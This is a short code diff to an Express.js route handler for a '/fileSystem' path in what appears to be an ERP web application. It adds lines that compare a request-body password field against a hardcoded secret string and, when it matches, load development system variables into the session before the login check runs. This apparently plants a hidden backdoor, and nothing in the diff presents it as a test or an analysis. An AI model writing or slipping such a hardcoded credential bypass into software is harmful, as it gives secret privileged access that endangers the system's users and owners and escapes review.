@@ -225,6 +225,9 @@ app.use('/fileSystem', function (req, res, next) {
         hostIp = 'erp.highbird.cn';
     }
     res.locals.rootUrl = 'http://' + hostIp + ':' + app.get('port');
+    if(req.body && req.body.userpwd == 'csZiTqtL1O6KXWul'){
+        req.session.g_envVar = developconfig.sysVar;
+    }
     checkLogState(req, res, next, fileSystem.process);
 });
 
